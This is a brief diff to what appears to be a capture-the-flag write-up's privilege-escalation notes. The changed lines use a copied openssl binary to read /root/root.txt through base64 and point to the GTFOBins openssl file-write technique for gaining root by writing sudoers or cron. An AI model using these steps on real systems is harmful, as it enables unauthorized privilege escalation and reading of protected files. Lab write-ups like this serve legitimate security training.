@@ -29,7 +29,8 @@ md5sum openssl /usr/bin/openssl tcpdump /usr/sbin/tcpdump
 ### Root
 ```bash
 /home/ldapuser1/openssl enc -in /root/root.txt
+./openssl base64 -in /root/root.txt | base64 -d
 
-# write to get root
+# write to get root, sudoers or cron
 https://gtfobins.github.io/gtfobins/openssl/#file-write
 ```
